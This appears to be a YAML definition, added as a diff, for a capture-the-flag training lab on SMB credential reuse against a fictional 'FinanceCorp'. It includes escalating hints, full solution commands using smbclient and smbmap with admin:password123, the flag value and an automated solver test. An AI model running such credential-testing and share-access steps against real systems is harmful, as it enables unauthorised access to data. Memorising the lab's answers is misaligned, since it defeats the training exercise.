@@ -1,0 +1,369 @@
+name: Single Service Credential Discovery
+description: You've discovered credentials during your FinanceCorp assessment. Test credential reuse across multiple services to demonstrate lateral movement risks.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - find credentials on one service, test on same service type
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your penetration test for FinanceCorp has successfully discovered credentials through 
+  various enumeration and brute force techniques. James Mitchell is particularly 
+  concerned about credential reuse, as compromised credentials on one service might 
+  provide access to additional systems.
+  
+  Credential reuse is a common security issue where the same username/password 
+  combinations are used across multiple services. FinanceCorp needs to understand if 
+  their authentication practices allow lateral movement through credential reuse.
+  
+  Your objective: Test discovered credentials against the same service type on 
+  FinanceCorp's infrastructure. Document successful authentications to demonstrate 
+  the scope of credential reuse risks.
+
+flag: "OCR{cr3d_r3us3_s4m3}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding SMB and Credential Discovery
+
+      **Server Message Block (SMB)** is a network protocol used primarily on Windows
+      networks for sharing files, printers, and other resources. It operates on
+      **port 445** (modern SMB) and is one of the most commonly targeted services
+      in penetration testing.
+
+      ### Why SMB Matters for Credential Testing
+
+      SMB authentication is a critical attack vector because:
+      - It uses username/password authentication that can be tested remotely
+      - Successful authentication reveals **file shares** containing sensitive data
+      - Credentials found on SMB often work on other services (credential reuse)
+      - Misconfigured shares may expose confidential files
+
+      ### SMB Shares
+
+      An SMB server can host multiple **shares** - named directories that clients
+      can connect to. Each share may have different access permissions:
+      - Some shares allow **anonymous/guest** access
+      - Others require **valid credentials**
+      - Default shares like `IPC$` and `C$` have special purposes
+
+      ### Your Goal
+
+      In this lab, you need to:
+      1. Discover what SMB shares are available on the target
+      2. Test credentials against the SMB service
+      3. Access the shares to find sensitive data (the flag)
+
+      Think about what tools you would use to interact with SMB services
+      from a Linux attack machine.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Tools for SMB Enumeration and Access
+
+      ### smbclient - The SMB Swiss Army Knife
+
+      `smbclient` is the primary tool for interacting with SMB shares from Linux.
+      It works similarly to an FTP client but for SMB/CIFS shares.
+
+      **Install if needed:**
+      ```bash
+      sudo apt install smbclient
+      ```
+
+      ### Key smbclient Operations
+
+      **List available shares on a host:**
+      ```bash
+      smbclient -L //<target> -U <username>
+      ```
+      - `-L` = list shares
+      - `-U` = specify username (you will be prompted for password)
+
+      **Connect to a specific share:**
+      ```bash
+      smbclient //<target>/<share_name> -U <username>
+      ```
+
+      **Anonymous/guest listing (no credentials):**
+      ```bash
+      smbclient -L //<target> -N
+      ```
+      - `-N` = no password (null session)
+
+      ### Other Useful SMB Tools
+
+      | Tool | Purpose |
+      |------|---------|
+      | `smbclient` | Interactive SMB client (list shares, download files) |
+      | `smbmap` | Enumerate shares and permissions |
+      | `enum4linux` | Comprehensive SMB/NetBIOS enumeration |
+      | `crackmapexec smb` | Automated credential testing |
+      | `nmap --script smb-*` | NSE scripts for SMB enumeration |
+
+      ### Inside smbclient
+
+      Once connected to a share, you can use FTP-like commands:
+      - `ls` - list files
+      - `cd <dir>` - change directory
+      - `get <file>` - download a file
+      - `more <file>` - view file contents
+      - `exit` - disconnect
+
+      Start by listing the available shares on the target.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical SMB Enumeration Examples
+
+      ### Step 1: Port Scan to Confirm SMB
+
+      First, verify SMB is running on the target:
+      ```bash
+      nmap -sV -p 445 <target>
+      ```
+
+      Expected output:
+      ```
+      PORT    STATE SERVICE     VERSION
+      445/tcp open  netbios-ssn Samba smbd 4.x
+      ```
+
+      ### Step 2: List Shares with Credentials
+
+      Try listing shares with the discovered credentials:
+      ```bash
+      smbclient -L //<target> -U admin
+      # Enter password when prompted: password123
+      ```
+
+      Example output showing available shares:
+      ```
+      Sharename       Type      Comment
+      ---------       ----      -------
+      share1          Disk      First share
+      share2          Disk      Second share
+      IPC$            IPC       IPC Service
+      ```
+
+      ### Step 3: Try Connecting to Each Share
+
+      ```bash
+      # Connect to the first share
+      smbclient //<target>/share1 -U admin
+      # Password: password123
+
+      # Once connected, list contents:
+      smb: \> ls
+      smb: \> cd subdirectory
+      smb: \> ls
+      ```
+
+      ### Alternative: Using smbmap
+
+      ```bash
+      smbmap -H <target> -u admin -p password123
+      ```
+
+      This shows all shares and your access level (READ, WRITE) at a glance.
+
+      ### Key Insight
+
+      There are **multiple shares** on this server. You need to check
+      **each share** for interesting files. The flag could be in any of them.
+      Don't stop after checking the first share!
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Credential Discovery Workflow
+
+      ### Complete Workflow
+
+      **Phase 1: Reconnaissance**
+      ```bash
+      # Scan the target to identify open ports
+      nmap -sV -p 445 <target>
+      ```
+
+      **Phase 2: Anonymous Enumeration**
+      ```bash
+      # Try listing shares without credentials (null session)
+      smbclient -L //<target> -N
+
+      # This may fail or show limited results without valid credentials
+      ```
+
+      **Phase 3: Authenticated Enumeration**
+      ```bash
+      # Use the discovered credentials to list all shares
+      smbclient -L //<target> -U admin%password123
+      ```
+      Note: The `%` syntax allows inline password (`-U user%password`).
+
+      **Phase 4: Share Access and Exploration**
+      ```bash
+      # Connect to each share and look for interesting files
+      smbclient //<target>/share1 -U admin%password123
+      smb: \> ls
+      smb: \> recurse ON
+      smb: \> ls
+      smb: \> exit
+
+      smbclient //<target>/share2 -U admin%password123
+      smb: \> ls
+      smb: \> recurse ON
+      smb: \> ls
+      ```
+
+      **Phase 5: Flag Retrieval**
+      ```bash
+      # When you find a flag file, download or display it
+      smb: \> more flag.txt
+      # or
+      smb: \> get flag.txt
+      ```
+
+      ### Important Tips
+
+      - Use `recurse ON` then `ls` to see all files in all subdirectories
+      - The flag file may be in a **subdirectory** within a share
+      - Check **all shares**, not just the first one you find
+      - The credentials `admin:password123` should work on all shares
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands to Solve This Lab
+
+      ### 1. Confirm SMB Service
+      ```bash
+      nmap -sV -p 445 <target>
+      ```
+
+      ### 2. List Available Shares
+      ```bash
+      smbclient -L //<target> -U admin%password123
+      ```
+
+      You should see shares named `share1` and `share2`.
+
+      ### 3. Check share1
+      ```bash
+      smbclient //<target>/share1 -U admin%password123
+      smb: \> ls
+      smb: \> exit
+      ```
+
+      ### 4. Check share2 (Where the Flag Is)
+      ```bash
+      smbclient //<target>/share2 -U admin%password123
+      smb: \> ls
+      smb: \> more flag.txt
+      smb: \> exit
+      ```
+
+      ### Alternative: One-Liner with smbclient
+      ```bash
+      smbclient //<target>/share2 -U admin%password123 -c "more flag.txt"
+      ```
+      The `-c` flag executes a command and exits.
+
+      ### Alternative: Using smbmap to Find the Flag
+      ```bash
+      # List all files recursively across all shares
+      smbmap -H <target> -u admin -p password123 -R
+      ```
+
+      This will show the full directory listing across all shares,
+      making it easy to spot `flag.txt`.
+
+      ### Alternative: Download the Flag
+      ```bash
+      smbclient //<target>/share2 -U admin%password123 -c "get flag.txt"
+      cat flag.txt
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Full Command Sequence
+
+      ```bash
+      # Step 1: Verify SMB is running
+      nmap -sV -p 445 <target>
+      # Output: 445/tcp open netbios-ssn Samba smbd 4.x
+
+      # Step 2: List shares with credentials
+      smbclient -L //<target> -U admin%password123
+      # Output:
+      #   Sharename       Type      Comment
+      #   ---------       ----      -------
+      #   share1          Disk
+      #   share2          Disk
+      #   IPC$            IPC       IPC Service
+
+      # Step 3: Check share1 (no flag here)
+      smbclient //<target>/share1 -U admin%password123 -c "ls"
+      # Output: (may be empty or contain decoy files)
+
+      # Step 4: Check share2 (flag is here)
+      smbclient //<target>/share2 -U admin%password123 -c "ls"
+      # Output:
+      #   .                    D        0  ...
+      #   ..                   D        0  ...
+      #   flag.txt             N       XX  ...
+
+      # Step 5: Read the flag
+      smbclient //<target>/share2 -U admin%password123 -c "more flag.txt"
+      # Output: OCR{...}
+      ```
+
+      ### Summary
+
+      | Step | Action | Tool |
+      |------|--------|------|
+      | 1 | Port scan | `nmap -sV -p 445` |
+      | 2 | List shares | `smbclient -L` |
+      | 3 | Check share1 | `smbclient //<target>/share1` |
+      | 4 | Check share2 | `smbclient //<target>/share2` |
+      | 5 | Read flag | `more flag.txt` |
+
+      ### Key Takeaways
+
+      - The credentials `admin:password123` provided access to both SMB shares
+      - The flag was located in **share2** at `flag.txt`
+      - In real assessments, credential discovery on one share often leads
+        to accessing additional sensitive data on other shares
+      - Always enumerate **all available shares** - don't stop at the first one
+      - Submit the flag value in the format `OCR{...}`
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "admin"
+    description: "admin credentials"
+
+workbook: "wiki/range/winpt/CH08_Credential_Reuse/01_Single_Service_Credential_Discovery/"
+
+test:
+  steps:
+    - name: "Verify SMB service is running on port 445"
+      command: "nmap -sV -p 445 {target.target}"
+      expect: "445/tcp"
+
+    - name: "List SMB shares with credentials"
+      command: "smbclient -L //{target.target} -U {cred.admin.user}%{cred.admin.pass} 2>&1"
+      expect: "share2"
+
+    - name: "Retrieve flag from share2"
+      command: "smbclient //{target.target}/share2 -U {cred.admin.user}%{cred.admin.pass} -c 'get flag.txt -' 2>&1"
+      expect: "OCR{cr3d_r3us3_s4m3}"
